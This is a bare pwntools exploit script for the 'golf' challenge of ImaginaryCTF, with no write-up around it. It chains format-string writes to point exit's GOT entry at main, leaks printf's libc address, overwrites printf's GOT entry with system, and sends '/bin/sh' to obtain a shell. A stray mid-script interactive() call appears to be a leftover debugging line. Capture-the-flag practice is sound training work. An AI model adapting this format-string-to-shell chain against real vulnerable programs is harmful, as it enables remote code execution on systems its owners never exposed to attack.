from pwn import *

#r = remote("golf.chal.imaginaryctf.org", 1337)
r = process("./golf_patched")
e = ELF("./golf_patched")
libc = ELF("./libc.so.6")
exploit = b"%*9$d%8$n" + b"\x00" * 7 + p64(e.got.exit) + p64(e.sym.main)
r.sendline(exploit)
exploit = b"%7$s" + b"\x00" * 4 + p64(e.got.printf)
r.interactive()
r.sendline(exploit)
sleep(10)
libc_leak = r.recvuntil(b"\x7f")
libc_leak = libc_leak + b"\x00" * 2
libc_leak = u64(libc_leak)
libc_base = libc_leak - libc.sym.printf
libc_system = libc_base + libc.sym.system
libc_system = p64(libc_system)
libc_system = u16(libc_system[1:3])
exploit = b"%*9$d%8$hn" + b"\x00" * 6 + p64(e.got.printf + 1) + p64(libc_system)
r.sendline(exploit)
exploit = b"/bin/sh\x00"
r.sendline(exploit)
r.interactive()
